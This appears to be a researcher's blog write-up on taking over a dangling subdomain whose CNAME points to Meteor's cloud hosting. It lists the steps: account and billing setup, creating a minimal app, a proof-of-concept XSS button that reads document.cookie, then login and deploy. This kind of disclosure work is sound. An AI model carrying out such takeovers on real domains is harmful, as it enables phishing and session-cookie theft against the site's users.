While scanning my automation system found subdomain whose cname record pointed to **eu-west-1.galaxy-ingress.meteor.com** with a 404 response code.

```404 Not Found: No applications registered for host '***.*****.***'.```

It's looks like subdomain takeover is possible here :)

[www.meteor.com](https://www.meteor.com/) says that

```Meteor is an open source platform for seamlessly building and deploying Web, Mobile, and Desktop applications in Javascript.```

After registering an account is necessary to add payment method under settings → billing,  because custom subdomain can be used only with non free application instances.

Most simple way to deploy your application to meteor cloud is to use meteor cli tool [https://docs.meteor.com/install.html](https://docs.meteor.com/install.html)

After installing, we can create new meteor application, I advise to use minimal template, because only minimal template doesn't have mongodb dependency:

{% highlight bash %}
rival@meteor-takeover % meteor create --minimal .
Created a new Meteor app in current directory.

To run your new app:                          
  meteor                                      
                                              
If you are new to Meteor, try some of the learning resources here:
  https://www.meteor.com/tutorials            
                                              
When you’re ready to deploy and host your new Meteor application, check out Cloud:
  https://www.meteor.com/cloud                
                                              
To start with a different app template, try one of the following:
...
{% endhighlight %}

Meteor will create all the necessary files for us.

The files located in the client directory are setting up your client side (web), you can see for example **client/main.html** where we can change html to something more appropriate, like this with xss payload:

{% highlight html %}
<head>
  <title>Rivalsec meteor takeover</title>
</head>
<body>
  <h1>Rivalsec meteor takeover </h1>
  <p>
    if the subdomain takeover is successful, a wide variety of attacks are possible (serving malicious content, phishing, stealing user session cookies, credentials, etc.).
  </p>
  <button onclick="alert(document.cookie);">Click me for XSS</button>
</body>
{% endhighlight %}

Now we can login and deploy our app:

**DEPLOY_HOSTNAME** must be same as subdomains cname

{% highlight raw %}
rival@meteor-takeover % meteor login                                                                                            
Username: rivalsec
Password:                                     
                                              
Logged in as rivalsec. Thanks for being a Meteor developer!

Meteor will deploy application and receive new https certificate for our subdomain.
